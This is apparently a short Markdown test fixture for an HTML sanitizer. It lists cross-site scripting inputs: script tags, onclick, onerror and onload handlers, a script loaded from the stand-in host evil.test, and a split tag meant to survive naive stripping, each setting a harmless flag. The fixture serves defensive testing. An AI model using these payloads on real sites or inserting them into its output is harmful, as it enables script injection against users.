# Script

A script element in the document body:

<script>window.__pwned = true;</script>

An inline handler on an element:

<div onclick="window.__pwned = true">click me</div>

<img src="x" onerror="window.__pwned = true">

A self-closing one, and one with an attribute the parser might split on:

<script src="https://evil.test/a.js"></script>
<svg onload="window.__pwned = true"></svg>

And one spelled to survive a naive strip:

<scr<script>ipt>window.__pwned = true;</scr</script>ipt>
